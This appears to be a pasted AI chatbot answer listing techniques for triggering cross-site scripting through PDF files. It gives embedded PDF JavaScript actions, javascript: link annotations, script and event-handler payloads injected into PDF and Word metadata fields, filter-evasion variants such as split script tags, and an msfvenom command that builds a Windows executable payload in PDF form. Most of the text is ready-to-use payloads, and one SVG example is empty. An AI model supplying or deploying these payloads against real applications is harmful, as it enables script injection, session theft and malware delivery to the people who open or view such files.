1. Embed JavaScript in PDF (app.launchURL / alert / XSS)
This runs in Adobe Reader, but can also be rendered in browser PDF viewers depending on the engine.

Payload:

js
Copy
Edit
app.alert("XSS Triggered!");
Or:

js
Copy
Edit
app.launchURL("javascript:alert('XSS')", true);
Embedded in raw PDF object:

pdf
Copy
Edit
1 0 obj
<<
  /Type /Action
  /S /JavaScript
  /JS (app.alert("XSS triggered!"))
>>
endobj
You can embed this with:

pdf-lib

qpdf, mutool, pdf.js

Manually editing with hexedit or notepad++ if raw

2. Trigger XSS via Embedded URL Redirect
If the app renders the PDF inline, but reflects part of the URL or meta-data (like title, author), you can embed payloads in those fields:

PDF Metadata Injection (Title field):

xml
Copy
Edit
<title"><script>alert(1)</script></title>
Or in a PDF object:

pdf
Copy
Edit
/Title (<script>alert(1)</script>)
If the application reflects the PDF title into its DOM, boom ‚Äî XSS.

3. Using javascript: URLs as Link Annotations
pdf
Copy
Edit
1 0 obj
<<
  /Type /Annot
  /Subtype /Link
  /Rect [0 0 100 100]
  /A <<
    /S /URI
    /URI (javascript:alert('XSS'))
  >>
>>
endobj
This creates a clickable area in the PDF that, if clicked, triggers JavaScript. Might still be parsed if embedded in browser viewers.

4. Embed SVG with XSS (for modern PDF renderers)
Some modern renderers support embedded SVGs. You can use:

svg
Copy
Edit

Insert it into the PDF stream, like via pdf-lib or custom manipulation.

üß∞ How to Build or Test This
Use tools like:

pdf-lib (Node.js or browser)

metasploit's PDF toolkit: msfvenom -p windows/x64/exec -f pdf

pdfid.py, pdf-parser.py ‚Äî for inspecting and modifying embedded JS




1. Metadata Payload (Word ‚Üí PDF)
In Word:

File ‚Üí Info ‚Üí Properties ‚Üí "Title"

Use this as the title:

html
Copy
Edit
"><script>alert('XSS')</script>
Same for:

Author

Subject

Tags

‚úÖ These fields often get injected into the HTML when the app shows ‚ÄúPDF details‚Äù ‚Äî perfect for reflected XSS testing.

2. Visible Content Injection
In Word, type this in the document body:

html
Copy
Edit
<script>alert('XSS')</script>
Or a sneaky version:

html
Copy
Edit
<img src=x onerror=alert('PDF-XSS')>
Format it in large, bold, or header styles to increase chances it‚Äôs picked up.

3. Use of Unicode/Obfuscation
Some apps attempt to sanitize <script> but fail on encoding tricks:

html
Copy
Edit
<script>alert`1`</script>
Or try breaking tags up:

html
Copy
Edit
<scr<script>ipt>alert(1)</script>
4. Inject into Custom Fields (for advanced testing)
Word ‚Üí Developer Tab ‚Üí Document Panel or Custom XML Parts

Insert:

html
Copy
Edit
"><svg/onload=alert(1)>
Then save ‚Üí export to PDF.
